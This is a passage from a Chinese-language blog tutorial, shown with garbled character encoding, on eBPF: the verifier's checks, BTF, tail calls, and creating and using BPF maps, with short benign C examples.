ç¨‹åºä¸­å…è®¸å¾ªç¯ï¼Œä½†åœ¨æ’°å†™æœ¬æ–‡æ—¶ï¼Œè¿˜æ²¡æœ‰ä¸€ä¸ªè¢«é‡‡ç”¨ã€‚</li><li>ç¨‹åºä¸ä¼šå°è¯•æ‰§è¡Œè¶…è¿‡å†…æ ¸å…è®¸çš„æœ€å¤§å€¼çš„æŒ‡ä»¤ã€‚æ­¤æ—¶ï¼Œè¦æ‰§è¡Œçš„æœ€å¤§æŒ‡ä»¤æ•°ä¸º4096ã€‚è¿™ä¸ªé™åˆ¶æ˜¯ä¸ºäº†é˜²æ­¢BPFæ°¸è¿œè¿è¡Œã€‚</li><li>ç¨‹åºä¸åŒ…å«ä»»ä½•æ— æ³•è®¿é—®çš„æŒ‡ä»¤ï¼Œä¾‹å¦‚ä»æœªæ‰§è¡Œçš„æ¡ä»¶æˆ–å‡½æ•°ã€‚è¿™å¯ä»¥é˜²æ­¢åœ¨è™šæ‹Ÿæœºä¸­åŠ è½½æ­»ä»£ç ï¼Œè¿™ä¹Ÿä¼šå»¶è¿ŸBPFç¨‹åºçš„ç»ˆæ­¢ã€‚</li><li>ç¨‹åºä¸ä¼šè¯•å›¾è·³å‡ºå®ƒçš„ç•Œé™ã€‚</li></ul><p>éªŒè¯å™¨æ‰§è¡Œçš„ç¬¬äºŒé¡¹æ£€æŸ¥æ˜¯BPFç¨‹åºçš„è¯•è¿è¡Œã€‚ è¿™æ„å‘³ç€éªŒè¯å™¨å°†å°è¯•åˆ†æç¨‹åºå°†è¦æ‰§è¡Œçš„æ¯æ¡æŒ‡ä»¤ï¼Œä»¥ç¡®ä¿å®ƒä¸ä¼šæ‰§è¡Œä»»ä½•æ— æ•ˆæŒ‡ä»¤ã€‚æ­¤æ¬¡æ‰§è¡Œè¿˜æ£€æŸ¥æ‰€æœ‰å†…å­˜æŒ‡é’ˆæ˜¯å¦è¢«æ­£ç¡®è®¿é—®å’Œå–æ¶ˆå¼•ç”¨ã€‚æœ€åï¼Œè¯•è¿è¡Œä¼šé€šçŸ¥éªŒè¯å™¨ç¨‹åºä¸­çš„æ§åˆ¶æµï¼Œä»¥ç¡®ä¿æ— è®ºç¨‹åºé‡‡ç”¨å“ªæ¡æ§åˆ¶è·¯å¾„ï¼Œå®ƒéƒ½åˆ°è¾¾<code>BPF_EXIT</code>æŒ‡ä»¤ã€‚ä¸ºæ­¤ï¼ŒéªŒè¯å™¨ä¼šè·Ÿè¸ªå †æ ˆä¸­æ‰€æœ‰è®¿é—®è¿‡çš„åˆ†æ”¯è·¯å¾„ï¼Œå¹¶åœ¨é‡‡ç”¨æ–°è·¯å¾„ä¹‹å‰å¯¹å…¶è¿›è¡Œè¯„ä¼°ï¼Œä»¥ç¡®ä¿å®ƒä¸ä¼šå¤šæ¬¡è®¿é—®ç‰¹å®šè·¯å¾„ã€‚åœ¨è¿™ä¸¤é¡¹æ£€æŸ¥é€šè¿‡åï¼ŒéªŒè¯å™¨è®¤ä¸ºç¨‹åºæ˜¯å¯ä»¥å®‰å…¨æ‰§è¡Œçš„ã€‚</p><p>å¦‚æœä½ å¯¹å¦‚ä½•åˆ†æç¨‹åºæ„Ÿå…´è¶£ï¼Œbpfç³»ç»Ÿè°ƒç”¨å…è®¸ä½ è¿›è¡Œè°ƒè¯•éªŒè¯ç¨‹åºçš„æ£€æŸ¥ã€‚ å½“ä½ ä½¿ç”¨æ­¤ç³»ç»Ÿè°ƒç”¨åŠ è½½ç¨‹åºæ—¶ï¼Œå¯ä»¥è®¾ç½®å‡ ä¸ªå±æ€§ï¼Œä½¿éªŒè¯ç¨‹åºæ‰“å°å…¶æ“ä½œæ—¥å¿—ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> bpf_attr attr = &#123; </span><br><span class="line">  .prog_type = type,</span><br><span class="line">.insns = ptr_to_u64(insns), </span><br><span class="line">  .insn_cnt = insn_cnt,</span><br><span class="line">.license =ptr_to_u64(license), </span><br><span class="line">  .log_buf =ptr_to_u64(bpf_log_buf), </span><br><span class="line">  .log_size = LOG_BUF_SIZE, </span><br><span class="line">  .log_level = <span class="number">1</span>,</span><br><span class="line">&#125;;</span><br><span class="line">bpf(BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br></pre></td></tr></table></figure><p><code>log_level</code>å­—æ®µå‘Šè¯‰éªŒè¯å™¨æ˜¯å¦æ‰“å°ä»»ä½•æ—¥å¿—ã€‚è®¾ç½®ä¸º1æ—¶ä¼šæ‰“å°å…¶æ—¥å¿—ï¼Œè®¾ç½®ä¸º0æ—¶ä¸ä¼šæ‰“å°ä»»ä½•å†…å®¹ã€‚å¦‚æœè¦æ‰“å°éªŒè¯å™¨æ—¥å¿—ï¼Œè¿˜éœ€è¦æä¾›æ—¥å¿—ç¼“å†²åŒºåŠå…¶å¤§å°ã€‚è¿™ä¸ªç¼“å†²åŒºæ˜¯ä¸€ä¸ªå¤šè¡Œå­—ç¬¦ä¸²ï¼Œä½ å¯ä»¥æ‰“å°å®ƒæ¥æ£€æŸ¥éªŒè¯å™¨æ‰€åšå‡ºçš„å†³å®šã€‚</p><p>ä¸‹ä¸€èŠ‚å°†ä»‹ç»BPFå¦‚ä½•åœ¨å†…å­˜ä¸­æ„é€ ç¨‹åºä¿¡æ¯ã€‚ç¨‹åºçš„ç»“æ„æ–¹å¼å°†æœ‰åŠ©äºå¼„æ¸…æ¥šå¦‚ä½•è®¿é—®BPFå†…éƒ¨ï¼Œå¸®åŠ©ä½ æ›´å¥½çš„è°ƒè¯•å’Œç†è§£ç¨‹åºçš„è¡Œä¸ºæ–¹å¼ã€‚</p><h3 id="BPFç±»å‹æ ¼å¼"><a href="#BPFç±»å‹æ ¼å¼" class="headerlink" title="BPFç±»å‹æ ¼å¼"></a>BPFç±»å‹æ ¼å¼</h3><p>BPFç±»å‹æ ¼å¼(BTF)æ˜¯å…ƒæ•°æ®ç»“æ„çš„é›†åˆï¼Œå¯å¢å¼ºBPF ç¨‹åºã€æ˜ å°„å’Œå‡½æ•°çš„è°ƒè¯•ä¿¡æ¯ã€‚BTFåŒ…å«æºä¿¡æ¯ï¼Œå› æ­¤æˆ‘ä»¬åœ¨åç»­æ‰€è®¨è®ºçš„<code>BPFTool</code>ç­‰å·¥å…·å¯ä»¥å‘ä½ å±•ç¤ºå¯¹BPFæ•°æ®çš„æ›´ä¸°å¯Œçš„è§£é‡Šã€‚è¿™äº›å…ƒæ•°æ®å­˜å‚¨åœ¨äºŒè¿›åˆ¶ç¨‹åºä¸­ä¸€ä¸ªç‰¹æ®Šçš„â€œ.BFTâ€å…ƒæ•°æ®éƒ¨åˆ†ä¸‹ã€‚BTFä¿¡æ¯æœ‰åŠ©äºä½¿ä½ çš„ç¨‹åºæ›´æ˜“äºè°ƒè¯•ï¼Œä½†å®ƒä¼šæ˜¾è‘—å¢åŠ äºŒè¿›åˆ¶æ–‡ä»¶çš„å¤§å°ï¼Œå› ä¸ºå®ƒéœ€è¦è·Ÿè¸ªç¨‹åºä¸­å£°æ˜çš„æ‰€æœ‰å†…å®¹çš„ç±»å‹ä¿¡æ¯ã€‚BPFéªŒè¯å™¨ä¹Ÿä½¿ç”¨æ­¤ä¿¡æ¯æ¥ç¡®ä¿ä½ çš„ç¨‹åºå®šä¹‰çš„ç»“æ„ç±»å‹æ˜¯æ­£ç¡®çš„ã€‚</p><p>BTFä¸“é—¨ç”¨äºæ³¨é‡ŠCè¯­è¨€ç±»å‹ã€‚ åƒ<code>LLVM</code>è¿™æ ·çš„BPFç¼–è¯‘å™¨çŸ¥é“å¦‚ä½•ä¸ºä½ åŒ…å«è¿™äº›ä¿¡æ¯ï¼Œå› æ­¤ä½ æ— éœ€å®Œæˆå°†è¿™äº›ä¿¡æ¯æ·»åŠ åˆ°æ¯ä¸ªç»“æ„çš„ç¹çä»»åŠ¡ã€‚ç„¶è€Œï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå·¥å…·é“¾ä»ç„¶éœ€è¦ä¸€äº›æ³¨é‡Šæ¥å¢å¼ºç¨‹åºã€‚åœ¨åç»­ç« èŠ‚ï¼Œæˆ‘ä»¬å°†æè¿°è¿™äº›æ³¨é‡Šæ˜¯å¦‚ä½•å‘æŒ¥ä½œç”¨çš„ï¼Œä»¥åŠåƒ<code>BPFTool</code>è¿™æ ·çš„å·¥å…·æ˜¯å¦‚ä½•æ˜¾ç¤ºè¿™äº›ä¿¡æ¯çš„ã€‚</p><h3 id="BPFå°¾è°ƒç”¨"><a href="#BPFå°¾è°ƒç”¨" class="headerlink" title="BPFå°¾è°ƒç”¨"></a>BPFå°¾è°ƒç”¨</h3><p>BPFç¨‹åºå¯ä»¥é€šè¿‡å°¾è°ƒç”¨è°ƒç”¨å…¶ä»–BPFç¨‹åºã€‚ è¿™æ˜¯ä¸€ä¸ªå¼ºå¤§çš„åŠŸèƒ½ï¼Œå› ä¸ºå®ƒå…è®¸ä½ é€šè¿‡ç»„åˆæ›´å°çš„BPFå‡½æ•°æ¥ç»„è£…æ›´å¤æ‚çš„ç¨‹åºã€‚<code>5.2</code>ä¹‹å‰çš„å†…æ ¸ç‰ˆæœ¬å¯¹BPFç¨‹åºå¯ä»¥ç”Ÿæˆçš„æœºå™¨æŒ‡ä»¤çš„æ•°é‡æœ‰ç¡¬æ€§é™åˆ¶ã€‚æ­¤é™åˆ¶è®¾ç½®ä¸º4096ï¼Œä»¥ç¡®ä¿ç¨‹åºå¯ä»¥åœ¨åˆç†çš„æ—¶é—´å†…ç»ˆæ­¢ã€‚ç„¶è€Œï¼Œéšç€äººä»¬æ„å»ºæ›´å¤æ‚çš„BPFç¨‹åºï¼Œä»–ä»¬éœ€è¦ä¸€ç§æ–¹æ³•æ¥æ‰©å±•å†…æ ¸å¼ºåŠ çš„æŒ‡ä»¤é™åˆ¶ï¼Œè¿™å°±æ˜¯å°¾è°ƒç”¨å‘æŒ¥ä½œç”¨çš„åœ°æ–¹ã€‚ä»å†…æ ¸ç‰ˆæœ¬<code>5.2</code>å¼€å§‹ï¼ŒæŒ‡ä»¤é™åˆ¶å¢åŠ åˆ°ä¸€ç™¾ä¸‡æ¡æŒ‡ä»¤ã€‚å°¾è°ƒç”¨åµŒå¥—ä¹Ÿå—åˆ°é™åˆ¶ï¼Œåœ¨æœ¬ä¾‹ä¸­ä¸º32ä¸ªè°ƒç”¨ï¼Œè¿™æ„å‘³ç€ä½ å¯ä»¥åœ¨ä¸€ä¸ªé“¾ä¸­ç»„åˆå¤šè¾¾32ä¸ªç¨‹åºæ¥ä¸ºé‡åˆ°çš„é—®é¢˜æä¾›è§£å†³æ–¹æ¡ˆã€‚</p><p>å½“ä½ ä»å¦ä¸€ä¸ªBPFç¨‹åºè°ƒç”¨ä¸€ä¸ªBPFç¨‹åºæ—¶ï¼Œå†…æ ¸ä¼šå®Œå…¨é‡ç½®ç¨‹åºä¸Šä¸‹æ–‡ã€‚è®°ä½è¿™ä¸€ç‚¹å¾ˆé‡è¦ï¼Œå› ä¸ºä½ å¯èƒ½éœ€è¦ä¸€ç§åœ¨ç¨‹åºä¹‹é—´å…±äº«ä¿¡æ¯çš„æ–¹æ³•ã€‚æ¯ä¸ªBPFç¨‹åºä½œä¸ºå…¶å‚æ•°æ¥æ”¶çš„ä¸Šä¸‹æ–‡å¯¹è±¡ä¸ä¼šå¸®åŠ©æˆ‘ä»¬è§£å†³è¿™ä¸ªæ•°æ®å…±äº«é—®é¢˜ã€‚ åœ¨ä¸‹ä¸€ç« ä¸­ï¼Œæˆ‘ä»¬å°†è®¨è®º<code>BPF map</code>ä½œä¸ºåœ¨ç¨‹åºä¹‹é—´å…±äº«ä¿¡æ¯çš„ä¸€ç§æ–¹å¼ã€‚æˆ‘ä»¬è¿˜ä¼šå±•ç¤ºå¦‚ä½•ä½¿ç”¨å°¾è°ƒç”¨ä»ä¸€ä¸ªBPFç¨‹åºè·³è½¬åˆ°å¦ä¸€ä¸ªçš„ç¤ºä¾‹ã€‚</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="http://vinin.me/2022/04/10/Hello-eBPF/" target="_blank" rel="noopener">http://vinin.me/2022/04/10/Hello-eBPF/</a></li><li><a href="https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/" target="_blank" rel="noopener">https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/</a></li><li><p><a href="https://elixir.bootlin.com/linux/v5.5.19/source/samples/bpf" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v5.5.19/source/samples/bpf</a></p></li><li><p><a href="https://cloud.tencent.com/developer/article/1472857" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1472857</a></p></li><li><a href="https://blog.csdn.net/Xiongzhizhu/article/details/51816243" target="_blank" rel="noopener">https://blog.csdn.net/Xiongzhizhu/article/details/51816243</a></li><li><a href="https://blog.csdn.net/weixin_43847470/article/details/122145676" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43847470/article/details/122145676</a></li></ul><h2 id="ç¬¬ä¸‰ç« èŠ‚"><a href="#ç¬¬ä¸‰ç« èŠ‚" class="headerlink" title="ç¬¬ä¸‰ç« èŠ‚"></a>ç¬¬ä¸‰ç« èŠ‚</h2><h3 id="BPFæ˜ å°„"><a href="#BPFæ˜ å°„" class="headerlink" title="BPFæ˜ å°„"></a>BPFæ˜ å°„</h3><p>åœ¨ç¨‹åºä¸­è°ƒç”¨è¡Œä¸ºçš„æ¶ˆæ¯ä¼ é€’æ˜¯è½¯ä»¶å·¥ç¨‹ä¸­å¹¿æ³›ä½¿ç”¨çš„æŠ€æœ¯ã€‚ ä¸€ä¸ªç¨‹åºå¯ä»¥é€šè¿‡å‘é€æ¶ˆæ¯æ¥ä¿®æ”¹å¦ä¸€ä¸ªç¨‹åºçš„è¡Œä¸ºï¼Œè¿™ä¹Ÿå…è®¸åœ¨è¿™äº›ç¨‹åºä¹‹é—´äº¤æ¢ä¿¡æ¯ã€‚ BPFæœ€ä»¤äººç—´è¿·çš„ä¸€æ–¹é¢æ˜¯ï¼Œå†…æ ¸ä»£ç å’Œè¢«åŠ è½½çš„ä»£ç å¯ä»¥åœ¨è¿è¡Œæ—¶ä½¿ç”¨æ¶ˆæ¯ä¼ é€’ç›¸äº’é€šä¿¡ã€‚</p><p>åœ¨æœ¬ç« ä¸­ï¼Œæˆ‘ä»¬å°†ä»‹ç»BPFç¨‹åºå’Œç”¨æˆ·ç©ºé—´ç¨‹åºå¦‚ä½•ç›¸äº’é€šä¿¡ã€‚æˆ‘ä»¬æè¿°äº†å†…æ ¸å’Œç”¨æˆ·ç©ºé—´ä¹‹é—´çš„ä¸åŒé€šä¿¡ç®¡é“ï¼Œä»¥åŠå®ƒä»¬å¦‚ä½•å­˜å‚¨ä¿¡æ¯ã€‚ æˆ‘ä»¬è¿˜å‘ä½ å±•ç¤ºäº†è¿™äº›ç®¡é“çš„ç”¨ä¾‹ï¼Œä»¥åŠå¦‚ä½•ä½¿è¿™äº›ç®¡é“ä¸­çš„æ•°æ®åœ¨ç¨‹åºåˆå§‹åŒ–ä¹‹é—´è¿›è¡ŒæŒä¹…åŒ–ã€‚</p><p>BPFæ˜ å°„æ˜¯é©»ç•™åœ¨å†…æ ¸ä¸­çš„<code>key/value</code>å­˜å‚¨ã€‚ ä»»ä½•çŸ¥é“å®ƒä»¬çš„BPFç¨‹åºéƒ½å¯ä»¥è®¿é—®å®ƒä»¬ã€‚åœ¨ç”¨æˆ·ç©ºé—´ä¸­è¿è¡Œçš„ç¨‹åºä¹Ÿå¯ä»¥é€šè¿‡ä½¿ç”¨æ–‡ä»¶æè¿°ç¬¦æ¥è®¿é—®è¿™äº›æ˜ å°„ã€‚åªè¦äº‹å…ˆæ­£ç¡®æŒ‡å®šæ•°æ®å¤§å°ï¼Œå°±å¯ä»¥åœ¨<code>map</code>ä¸­å­˜å‚¨ä»»ä½•ç±»å‹çš„æ•°æ®ã€‚ å†…æ ¸å°†é”®å’Œå€¼è§†ä¸ºäºŒè¿›åˆ¶ç±»å‹çš„å¤§å¯¹è±¡(blob)ï¼Œå®ƒä¸å…³å¿ƒä½ åœ¨<code>map</code>ä¸­ä¿ç•™çš„å†…å®¹ã€‚BPF éªŒè¯å™¨åŒ…å«å¤šç§ä¿æŠ¤æªæ–½ï¼Œä»¥ç¡®ä¿ä½ æ‰€åˆ›å»ºå’Œè®¿é—®<code>map</code>çš„æ–¹å¼æ˜¯å®‰å…¨çš„ã€‚ </p><h4 id="åˆ›å»ºBPFæ˜ å°„"><a href="#åˆ›å»ºBPFæ˜ å°„" class="headerlink" title="åˆ›å»ºBPFæ˜ å°„"></a>åˆ›å»ºBPFæ˜ å°„</h4><p>åˆ›å»ºBPFæ˜ å°„æœ€ç›´æ¥çš„æ–¹æ³•æ˜¯ä½¿ç”¨bpfç³»ç»Ÿè°ƒç”¨ã€‚å½“è°ƒç”¨çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯<code>BPF_MAP_CREATE</code>æ—¶ï¼Œæ˜¯åœ¨å‘Šè¯‰å†…æ ¸ä½ æƒ³è¦åˆ›å»ºä¸€ä¸ªæ–°çš„æ˜ å°„ã€‚æ­¤è°ƒç”¨å°†è¿”å›ä¸ä½ åˆšåˆ›å»ºçš„<code>BPF Maps</code>å…³è”çš„æ–‡ä»¶æè¿°ç¬¦æ ‡è¯†ç¬¦ã€‚ç³»ç»Ÿè°ƒç”¨ä¸­çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ­¤æ˜ å°„çš„é…ç½®ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> bpf_attr &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    __u32 map_type;<span class="comment">/* one of the values from bpf_map_type */</span></span><br><span class="line">    __u32 key_size;<span class="comment">/* size of the keys, in bytes */</span></span><br><span class="line">    __u32 value_size;<span class="comment">/* size of the values, in bytes */</span></span><br><span class="line">    __u32 max_entries;<span class="comment">/* maximum number of entries in the map */</span></span><br><span class="line">    __u32 map_flags;<span class="comment">/* flags to modify how we create the map */</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç³»ç»Ÿè°ƒç”¨ä¸­çš„ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯æ­¤é…ç½®å±æ€§çš„å¤§å°ã€‚ä¾‹å¦‚ï¼Œä½ å¯ä»¥åˆ›å»ºä¸€ä¸ª<code>hash map</code>æ¥å­˜å‚¨æ— ç¬¦å·æ•´æ•°ä½œä¸ºé”®å’Œå€¼ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> bpf_attr my_map &#123; </span><br><span class="line">  .map_type = BPF_MAP_TYPE_HASH, </span><br><span class="line">  .key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>), </span><br><span class="line">  .value_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>), </span><br><span class="line">  .max_entries = <span class="number">100</span>,</span><br><span class="line">.map_flags = BPF_F_NO_PREALLOC,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> fd = bpf(BPF_MAP_CREATE, &amp;my_map, <span class="keyword">sizeof</span>(my_map));</span><br></pre></td></tr></table></figure><p>å¦‚æœè°ƒç”¨å¤±è´¥ï¼Œå†…æ ¸å°†è¿”å›å€¼-1ã€‚ å¤±è´¥çš„åŸå› å¯èƒ½æœ‰ä¸‰ä¸ªã€‚å¦‚æœå…¶ä¸­ä¸€ä¸ªå±æ€§æ— æ•ˆï¼Œå†…æ ¸å°†<code>errno</code>å˜é‡è®¾ç½®ä¸º<code>EINVAL</code>ã€‚ å¦‚æœæ‰§è¡Œæ“ä½œçš„ç”¨æˆ·æ²¡æœ‰è¶³å¤Ÿçš„æƒé™ï¼Œå†…æ ¸ä¼šå°†<code>errno</code>å˜é‡è®¾ç½®ä¸º<code>EPERM</code>ã€‚ æœ€åï¼Œå¦‚æœæ²¡æœ‰è¶³å¤Ÿçš„å†…å­˜æ¥å­˜å‚¨æ˜ å°„ï¼Œå†…æ ¸å°†<code>errno</code>å˜é‡è®¾ç½®ä¸º<code>ENOMEM</code>ã€‚</p><h4 id="åˆ›å»ºBPFæ˜ å°„çš„ELFçº¦å®š"><a href="#åˆ›å»ºBPFæ˜ å°„çš„ELFçº¦å®š" class="headerlink" title="åˆ›å»ºBPFæ˜ å°„çš„ELFçº¦å®š"></a>åˆ›å»ºBPFæ˜ å°„çš„ELFçº¦å®š</h4><p>å†…æ ¸åŒ…å«ä¸€äº›çº¦å®šå’ŒåŠ©æ‰‹æ¥ç”Ÿæˆå’Œä½¿ç”¨<code>BPF maps</code>ã€‚ ä½ å¯èƒ½ä¼šå‘ç°è¿™äº›çº¦å®šæ¯”ç›´æ¥æ‰§è¡Œç³»ç»Ÿè°ƒç”¨æ›´é¢‘ç¹åœ°å‡ºç°ï¼Œå› ä¸ºå®ƒä»¬æ›´å…·å¯è¯»æ€§ä¸”æ›´å®¹æ˜“éµå¾ªã€‚è¯·è®°ä½ï¼Œè¿™äº›çº¦å®šä»ç„¶ä½¿ç”¨bpfç³»ç»Ÿè°ƒç”¨æ¥åˆ›å»º<code>map</code>ï¼Œå³ä½¿ç›´æ¥åœ¨å†…æ ¸ä¸­è¿è¡Œä¹Ÿæ˜¯å¦‚æ­¤ï¼Œå¦‚æœä¸çŸ¥é“äº‹å…ˆéœ€è¦å“ªç§<code>map</code>ï¼Œä½ ä¼šå‘ç°ç›´æ¥ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨æ›´æœ‰ç”¨ã€‚</p><p>helperå‡½æ•°<code>bpf_map_create</code>åŒ…è£…äº†åˆšæ‰çœ‹åˆ°çš„ä»£ç ï¼Œä»¥ä¾¿æ›´å®¹æ˜“æ ¹æ®éœ€è¦åˆå§‹åŒ–<code>map</code>ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å®ƒåˆ›å»ºå…ˆå‰å®šä¹‰çš„<code>map</code>ï¼Œåªéœ€ä¸€è¡Œä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line">fd = bpf_create_map(BPF_MAP_TYPE_HASH, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="number">100</span>,</span><br><span class="line">        BPF_F_NO_PREALOC);</span><br></pre></td></tr></table></figure><p>å¦‚æœä½ çŸ¥é“ä½ çš„ç¨‹åºéœ€è¦å“ªç§<code>map</code>ï¼Œä½ ä¹Ÿå¯ä»¥é¢„å…ˆå®šä¹‰å®ƒã€‚è¿™æœ‰åŠ©äºåœ¨ç¨‹åºé¢„å…ˆä½¿ç”¨çš„<code>map</code>ä¸­è·å¾—æ›´é«˜çš„å¯è§æ€§ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> my_map </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_HASH, </span><br><span class="line">  .key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>), </span><br><span class="line">  .value_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>), </span><br><span class="line">  .max_entries = <span class="number">100</span>,</span><br><span class="line">.map_flags =BPF_F_NO_PREALLOC, </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å½“æ‚¨ä»¥è¿™ç§æ–¹å¼å®šä¹‰<code>map</code>æ—¶ï¼Œæ‚¨ä½¿ç”¨çš„æ˜¯æ‰€è°“çš„<code>section</code>å±æ€§ï¼Œåœ¨æœ¬ä¾‹ä¸­ä¸º<code>SEC(&quot;maps&quot;)</code>ã€‚ è¿™ä¸ªå®å‘Šè¯‰å†…æ ¸è¿™ä¸ªç»“æ„æ˜¯ä¸€ä¸ªBPFæ˜ å°„ï¼Œå®ƒåº”è¯¥è¢«ç›¸åº”åœ°åˆ›å»ºã€‚ä½ å¯èƒ½å·²ç»æ³¨æ„åˆ°ï¼Œåœ¨è¿™ä¸ªæ–°ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬æ²¡æœ‰ä¸<code>map</code>å…³è”çš„æ–‡ä»¶æè¿°ç¬¦æ ‡è¯†ç¬¦ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå†…æ ¸ä½¿ç”¨ä¸€ä¸ªåä¸º<code>map_data</code>çš„å…¨å±€å˜é‡æ¥å­˜å‚¨æœ‰å…³ç¨‹åºä¸­<code>map</code>çš„ä¿¡æ¯ã€‚ è¿™ä¸ªå˜é‡æ˜¯ä¸€ä¸ªç»“æ„æ•°ç»„ï¼Œå®ƒæŒ‰ç…§ä½ åœ¨ä»£ç ä¸­æŒ‡å®šæ¯ä¸ªæ˜ å°„çš„æ–¹å¼æ’åºã€‚ä¾‹å¦‚ï¼Œå¦‚æœå‰ä¸€ä¸ª<code>map</code>æ˜¯ä½ çš„ä»£ç ä¸­æŒ‡å®šçš„ç¬¬ä¸€ä¸ª<code>map</code>ï¼Œä½ å°†ä»æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ è·å–æ–‡ä»¶æè¿°ç¬¦æ ‡è¯†ç¬¦ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fd = map_data[<span class="number">0</span>].fd;</span><br></pre></td></tr></table></figure><p>ä½ è¿˜å¯ä»¥ä»æ­¤ç»“æ„ä¸­è®¿é—®<code>map</code>çš„åç§°åŠå…¶å®šä¹‰ï¼Œ æ­¤ä¿¡æ¯æœ‰æ—¶å¯ç”¨äºè°ƒè¯•å’Œè·Ÿè¸ªç›®çš„ã€‚åˆå§‹åŒ–<code>map</code>åï¼Œä½ å¯ä»¥å¼€å§‹ä½¿ç”¨å®ƒä»¬åœ¨å†…æ ¸å’Œç”¨æˆ·ç©ºé—´ä¹‹é—´å‘é€æ¶ˆæ¯ã€‚ ç°åœ¨è®©æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•ä½¿ç”¨è¿™äº›<code>map</code>æ‰€å­˜å‚¨çš„æ•°æ®è¿›è¡Œå·¥ä½œã€‚</p><h3 id="ä¸BPFæ˜ å°„å·¥ä½œ"><a href="#ä¸BPFæ˜ å°„å·¥ä½œ" class="headerlink" title="ä¸BPFæ˜ å°„å·¥ä½œ"></a>ä¸BPFæ˜ å°„å·¥ä½œ</h3><p>å†…æ ¸å’Œç”¨æˆ·ç©ºé—´ä¹‹é—´çš„é€šä¿¡å°†æˆä¸ºä½ ç¼–å†™çš„æ¯ä¸ªBPFç¨‹åºçš„åŸºç¡€éƒ¨åˆ†ã€‚ ä¸ºå†…æ ¸ç¼–å†™ä»£ç æ—¶è®¿é—®æ˜ å°„çš„<code>API</code>ä¸ä¸ºç”¨æˆ·ç©ºé—´ç¨‹åºç¼–å†™ä»£ç æ—¶ä¸åŒã€‚ æœ¬èŠ‚ä»‹ç»æ¯ä¸ªå®ç°çš„è¯­ä¹‰å’Œå…·ä½“ç»†èŠ‚ã€‚</p><h4 id="æ›´æ–°BPFæ˜ å°„ä¸­çš„å…ƒç´ "><a href="#æ›´æ–°BPFæ˜ å°„ä¸­çš„å…ƒç´ " class="headerlink" title="æ›´æ–°BPFæ˜ å°„ä¸­çš„å…ƒç´ "></a>æ›´æ–°BPFæ˜ å°„ä¸­çš„å…ƒç´ </h4><p>åˆ›å»ºä»»ä½•<code>map</code>åï¼Œä½ å¯èƒ½å¸Œæœ›ç”¨ä¿¡æ¯å¡«å……å®ƒã€‚ä¸ºæ­¤ï¼Œå†…æ ¸åŠ©æ‰‹æä¾›äº†å‡½æ•°<code>bpf_map_update_elem</code>ã€‚ å¦‚æœä½ åœ¨å†…æ ¸è¿è¡Œçš„ç¨‹åºä¸­ä»<code>bpf/bpf_helpers.h</code>åŠ è½½è¿™ä¸ªå‡½æ•°ï¼Œä¸åœ¨ç”¨æˆ·ç©ºé—´è¿è¡Œçš„ç¨‹åºä¸­ä»<code>tools/lib/bpf/bpf.h</code>åŠ è½½å®ƒï¼Œè¿™ä¸ªå‡½æ•°çš„ç­¾åæ˜¯ä¸åŒçš„ã€‚è¿™æ˜¯å› ä¸ºåœ¨å†…æ 